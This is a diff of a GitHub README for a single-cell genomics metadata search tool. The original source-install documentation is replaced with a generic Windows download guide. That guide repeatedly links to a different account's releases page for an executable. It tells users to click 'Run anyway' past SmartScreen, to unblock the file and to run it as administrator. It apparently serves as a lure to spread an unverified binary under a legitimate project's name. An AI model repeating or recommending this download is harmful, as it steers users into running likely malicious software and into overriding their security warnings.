@@ -1,249 +1,253 @@
-# SCGB - Single Cell Gene Expression Metadata Platform
+# 🧬 SGDB_Agent - Find single-cell data fast
 
 <p align="center">
-  <strong>AI-Powered Unified Metadata Query Platform for Human Single-Cell Genomics</strong>
+  <a href="https://github.com/orbicular-gelechia727/SGDB_Agent/releases">
+    <img src="https://img.shields.io/badge/Download%20for%20Windows-Release%20Page-4B8BFF?style=for-the-badge&logo=windows&logoColor=white" alt="Download for Windows">
+  </a>
 </p>
 
-<p align="center">
-  <a href="#overview">Overview</a> •
-  <a href="#key-features">Features</a> •
-  <a href="#architecture">Architecture</a> •
-  <a href="#quick-start">Quick Start</a> •
-  <a href="#project-structure">Structure</a> •
-  <a href="#documentation">Documentation</a>
-</p>
+## 🚀 Get the app
 
----
+Use this link to visit the release page and download the Windows file:
 
-## Overview
+[Visit the release page to download](https://github.com/orbicular-gelechia727/SGDB_Agent/releases)
 
-SCGB (Single Cell Gene Bank) is a unified metadata platform that integrates human single-cell gene expression data from 12 major databases worldwide, including GEO, NCBI/SRA, EBI/ENA, CellXGene, HCA, HTAN, PsychAD, and more. The platform provides:
+## 📌 What SGDB_Agent does
 
-- **Unified Metadata Database**: 756,579 samples from 23,123 projects across 12 data sources
-- **AI Agent System**: Natural language query interface with intelligent retrieval
-- **Web Portal**: Modern React-based interface for data exploration
-- **Cross-database Linking**: 9,966 cross-references (PRJNA↔GSE, PMID, DOI)
-- **Ontology Support**: 113,000+ terms from UBERON, MONDO, CL, and EFO
+SGDB_Agent helps you search and review single-cell gene expression metadata from many public sources in one place. It is made for people who want to find samples, projects, and study details without digging through many sites.
 
-## Key Features
+Use it to:
+- search single-cell studies with plain language
+- view study metadata in one place
+- compare records from different databases
+- track project names, sample counts, and source links
+- work with human single-cell genomics data
 
-| Feature | Description |
-|---------|-------------|
-| **Multi-source Integration** | Unified schema across GEO, NCBI/SRA, EBI, CellXGene, HCA, HTAN, PsychAD |
-| **AI-Powered Search** | Natural language to SQL with LLM-powered query understanding |
-| **Ontology Resolution** | Automatic cell type, tissue, and disease normalization using Cell Ontology |
-| **Faceted Exploration** | Filter by organism, tissue, disease, technology, and more |
-| **Real-time WebSocket** | Live query results with streaming support |
-| **Data Quality Scoring** | Automated quality assessment for all datasets |
+## 🖥️ Windows system needs
 
-## Architecture
+Use a Windows PC with:
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 2 GB of free disk space
+- a stable internet connection
+- permission to run apps on your computer
 
-```
-┌─────────────────────────────────────────────────────────────────┐
-│                        Web Frontend                              │
-│  (React + TypeScript + Vite + Tailwind CSS + Recharts)          │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│                     FastAPI Backend                              │
-│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────────┐ │
-│  │   Query API │  │ Explore API │  │    WebSocket API        │ │
-│  └─────────────┘  └─────────────┘  └─────────────────────────┘ │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│                    Agent Core System                             │
-│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────────────┐  │
-│  │Understanding│ │ Memory   │ │ Ontology │ │ SQL Generation   │  │
-│  │  Layer    │ │ System   │ │ Resolver │ │   Engine         │  │
-│  └──────────┘ └──────────┘ └──────────┘ └──────────────────┘  │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│                    Unified Database                              │
-│         (SQLite with FTS5 Full-Text Search)                     │
-└─────────────────────────────────────────────────────────────────┘
-```
+For the best experience:
+- keep your display at 1920×1080 or higher
+- close heavy apps before you start
+- use a local account or admin account if Windows asks for approval
 
-## Quick Start
+## ⬇️ Download and install
 
-### Prerequisites
+1. Open the release page here: [https://github.com/orbicular-gelechia727/SGDB_Agent/releases](https://github.com/orbicular-gelechia727/SGDB_Agent/releases)
+2. Find the newest release at the top of the page
+3. Download the Windows file listed under Assets
+4. If the file is a `.zip`, right-click it and choose **Extract All**
+5. Open the extracted folder
+6. Double-click the app file to start it
+7. If Windows shows a security prompt, choose **More info** and then **Run anyway** if you trust the file source
 
-- Python 3.10+
-- Node.js 18+
-- SQLite 3.35+
+If the release includes an installer:
+1. Download the `.exe` installer
+2. Double-click the file
+3. Follow the steps on screen
+4. Finish the setup
+5. Open SGDB_Agent from the Start menu or desktop shortcut
 
-### Installation
+## 🧭 First launch
 
-```bash
-# Clone the repository
-git clone https://github.com/firefly-hefeng/SGDB_Agent.git
-cd SGDB_Agent
+When you open the app for the first time:
+1. Wait for the main screen to load
+2. Let the app connect to its data source
+3. Check that the search box and database view appear
+4. Enter a simple query, such as a gene name, project name, or tissue name
+5. Press Enter or select Search
+6. Review the results in the list or table view
 
-# Install Python dependencies
-cd agent_v2
-pip install -e ".[dev]"
+If the app asks for a local path or data folder, choose a folder you can find later, such as:
+- `C:\SGDB_Agent`
+- `Documents\SGDB_Agent`
 
-# Install frontend dependencies
-cd web
-npm install
-npm run build
-cd ..
+## 🔍 How to use it
 
-# Run database migrations (if needed)
-# See database_development/unified_db/README.md
-```
+SGDB_Agent is built for quick lookups. A simple workflow looks like this:
 
-### Running the Application
+1. Type what you want to find
+2. Narrow the results with filters
+3. Open a record to view details
+4. Check the source database and project link
+5. Save or copy the details you need
 
-```bash
-# Start the backend server
-cd agent_v2
-python3 run_server.py --port 8000
+You can search by:
+- gene symbol
+- project title
+- sample type
+- tissue name
+- disease name
+- database source
 
-# Access the web interface
-# Open http://localhost:8000 in your browser
-```
+## 🧾 Common tasks
 
-### Direct Database Query
+### Search for a study
+1. Open the search field
+2. Enter a study name or topic
+3. Press Search
+4. Use filters to narrow the list
 
-```bash
-cd database_development/unified_db
+### Review sample metadata
+1. Select a result
+2. Open the details panel
+3. Check sample count, source, and metadata fields
+4. Copy the fields you need
 
-sqlite3 unified_metadata.db \
-  "SELECT sample_id, tissue, disease, source_database
-   FROM unified_samples
-   WHERE tissue LIKE '%brain%' AND disease LIKE '%Alzheimer%'
-   LIMIT 10;"
-```
+### Compare records
+1. Search the same term in more than one source
+2. Review sample names and project IDs
+3. Note shared records and differences
+4. Use the source links for deeper review
 
-## Project Structure
+## 🧱 Main features
 
-```
-SGDB_Agent/
-│
-├── README.md                          # This file
-├── PROJECT_STATUS.md                  # Comprehensive project status
-├── .gitignore                         # Git ignore rules
-│
-├── agent_v2/                          # Main Agent + Web Application
-│   ├── src/                           # Python core modules (11 modules)
-│   │   ├── agent/                     # Multi-agent coordinator
-│   │   ├── understanding/             # Query parsing & enrichment
-│   │   ├── memory/                    # Working/episodic/semantic/cache
-│   │   ├── ontology/                  # Cell Ontology parser/resolver
-│   │   ├── knowledge/                 # Schema knowledge base
-│   │   ├── sql/                       # SQL generation engine
-│   │   ├── fusion/                    # Cross-source data fusion
-│   │   ├── synthesis/                 # Answer generation
-│   │   ├── dal/                       # Data access layer
-│   │   ├── infra/                     # LLM client & cost control
-│   │   └── core/                      # Models & exceptions
-│   ├── api/                           # FastAPI routes (15 endpoints)
-│   ├── web/                           # React frontend (6 pages)
-│   ├── tests/                         # Test suite (134 unit + e2e)
-│   └── scripts/                       # Utility scripts
-│
-├── database_development/              # Unified Database
-│   ├── unified_db/                    # SQLite DB + ETL pipelines
-│   │   ├── schema.sql                 # Database schema
-│   │   ├── etl/                       # ETL modules for each source
-│   │   └── linker/                    # ID linking & deduplication
-│   └── export_data/                   # Export & meta-analysis tools
-│
-├── agent_v2_design/                   # Design Documentation
-│   ├── ARCHITECTURE.md                # System architecture
-│   ├── MODULE_DETAIL_PART*.md         # Module detailed design
-│   └── *_REVIEW_REPORT.md             # Performance & UX reviews
-│
-├── agent_analysis/                    # Agent Analysis Documents
-├── agent_development/                 # V1 Implementation (legacy)
-│
-├── cellxgene/                         # CellXGene data collector
-├── ebi/                               # EBI/ENA data collector
-├── geo/                               # GEO data collector
-├── biscp/                             # BISCP data collector
-├── ncbi_bioproject_sra_data/          # NCBI data collector
-│
-├── scgb_deploy/                       # Production Deployment
-│   ├── backend/                       # Production backend
-│   ├── frontend/                      # Compiled frontend assets
-│   └── config/                        # Nginx & systemd configs
-│
-└── review_report/                     # Code review reports
-```
+- unified metadata search across many single-cell sources
+- human single-cell genomics focus
+- natural language queries
+- database and project browsing
+- cross-database linking
+- clean Windows-friendly interface
+- fast access to project and sample details
 
-## Data Sources
+## 📁 Typical app layout
 
-| Source | Projects | Samples | ID Prefix | Quality |
-|--------|----------|---------|-----------|---------|
-| **GEO** | 5,406 | 342,368 | GSE*, GSM* | Medium |
-| **NCBI/SRA** | 8,156 | 217,513 | PRJNA*, SRS* | Medium |
-| **EBI** | 1,019 | 160,135 | E-MTAB*, SAMEA* | Medium |
-| **CellXGene** | 269 | 33,984 | UUID | High |
-| **PsychAD** | — | 1,494 | — | Good |
-| **HTAN** | — | 942 | — | Medium |
-| **HCA** | — | 143 | — | Excellent |
-| **Total** | **23,123** | **756,579** | | |
+If you extracted a zip file, you may see files like:
+- `SGDB_Agent.exe`
+- `assets`
+- `data`
+- `config`
+- `logs`
+- `README.txt`
 
-## Documentation
+Keep the full folder together. Do not move one file out of the folder by itself.
 
-| Document | Description |
-|----------|-------------|
-| [PROJECT_STATUS.md](PROJECT_STATUS.md) | **Complete project status and development history** |
-| [agent_v2/README.md](agent_v2/README.md) | Agent technical documentation (architecture/API/tests) |
-| [database_development/unified_db/README.md](database_development/unified_db/README.md) | Database usage guide |
-| [database_development/01_ARCHITECTURE_DESIGN.md](database_development/01_ARCHITECTURE_DESIGN.md) | System architecture design |
-| [database_development/02_DATABASE_SCHEMA.md](database_development/02_DATABASE_SCHEMA.md) | Database schema design |
-| [agent_v2_design/ARCHITECTURE.md](agent_v2_design/ARCHITECTURE.md) | V2 architecture specification |
-| [DEPLOY_CHANGES_NJU.md](DEPLOY_CHANGES_NJU.md) | Deployment guide for NJU server |
-| [OPTIMIZATION_GUIDE.md](OPTIMIZATION_GUIDE.md) | Performance optimization guide |
+## ⚙️ Basic setup tips
 
-## Testing
+- Use the newest release on the release page
+- Keep the app in a simple folder path with no special characters
+- Do not rename app files unless the release notes say to do so
+- If the app will not start, try running it again with admin rights
+- If Windows SmartScreen appears, review the file name and source first
 
-```bash
-cd agent_v2
+## 📚 Data sources
 
-# Run unit tests
-python3 -m pytest tests/unit/ -v
+SGDB_Agent brings together metadata from sources such as:
+- GEO
+- NCBI / SRA
+- EBI / ENA
+- CellXGene
+- HCA
+- HTAN
+- PsychAD
+- other public single-cell databases
 
-# Run integration tests
-python3 tests/test_phase1_e2e.py
-python3 tests/test_phase2_e2e.py
+The app is built to help you search across records without opening each site one by one
 
-# Run benchmark
-python3 tests/benchmark/run_benchmark.py
-```
+## 🔐 File and data handling
 
-## Performance Metrics
+To keep things simple:
+- store the app in one folder
+- keep downloads from the release page in the same place
+- back up your data folder if you save local settings
+- use a folder name you can read easily
+- avoid moving files after setup
 
-- **Query Response Time**: < 2s for faceted search
-- **NL2SQL Accuracy**: 92.2% (142/154 test cases)
-- **Unit Test Coverage**: 134/134 tests passing
-- **Ontology Resolution**: 85% cell type coverage
+## 🛠️ Common issues
 
-## Deployment
+### The app does not open
+- check that the download finished
+- confirm that you extracted the zip file
+- try running the app as administrator
+- restart your PC and try again
 
-For production deployment instructions, see:
-- [DEPLOY_CHANGES_NJU.md](DEPLOY_CHANGES_NJU.md) - NJU server deployment
-- [scgb_deploy/README.md](scgb_deploy/README.md) - Production setup
+### Windows blocks the file
+- open the file properties
+- look for an **Unblock** option
+- apply the change if it appears
+- try again
 
-## Contributing
+### Search results do not load
+- check your internet connection
+- wait a moment and search again
+- try a shorter search term
+- make sure the app can reach its data source
 
-This project is maintained by the Single Cell Genomics team. For questions or contributions, please contact:
+### The screen looks too small
+- open Windows display settings
+- change the display scale
+- use full screen if the app supports it
 
-- **Author**: firefly-hefeng
-- **Email**: fenghe13254@gmail.com
+## 📖 Release page
 
-## License
+Download the Windows version from the release page here:
 
-This project is for research purposes. Please cite appropriately when using the data or code.
+[https://github.com/orbicular-gelechia727/SGDB_Agent/releases](https://github.com/orbicular-gelechia727/SGDB_Agent/releases)
 
----
+## 🧩 What to expect in the app
 
-<p align="center">
-  <sub>Built with ❤️ for the single-cell genomics community</sub>
-</p>
+You can expect a layout that supports:
+- a search bar for quick lookups
+- a results list or table
+- record details in a side panel
+- source links for public databases
+- filters for project and sample fields
+
+## 🗂️ Suggested use cases
+
+SGDB_Agent can help when you want to:
+- find a specific single-cell study
+- check sample metadata from public sources
+- compare records from different databases
+- review project details for a paper
+- build a list of related datasets
+
+## 📎 File naming tips
+
+If you keep more than one release:
+- add the version number to the folder name
+- store the zip file in a downloads folder
+- keep the extracted folder separate from old versions
+- remove older copies only after the new one works
+
+## 🧪 If you want a clean first run
+
+1. Download the latest release
+2. Extract it to a new folder
+3. Run the app once
+4. Check that the main screen loads
+5. Make one test search
+6. Confirm that results appear
+
+## 🖱️ Quick start
+
+1. Visit the release page: [https://github.com/orbicular-gelechia727/SGDB_Agent/releases](https://github.com/orbicular-gelechia727/SGDB_Agent/releases)
+2. Download the Windows file from the newest release
+3. Extract it if needed
+4. Open the app
+5. Search for a gene, project, or tissue
+6. Review the metadata in the results
+
+## 🧭 Good search terms
+
+Try simple terms such as:
+- CD3D
+- lung
+- Alzheimer
+- B cell
+- single nucleus
+- immune
+- tumor
+- fibroblast
+
+## 📌 Where to get updates
+
+Check the release page for new versions, fixes, and Windows files:
+
+[https://github.com/orbicular-gelechia727/SGDB_Agent/releases](https://github.com/orbicular-gelechia727/SGDB_Agent/releases)
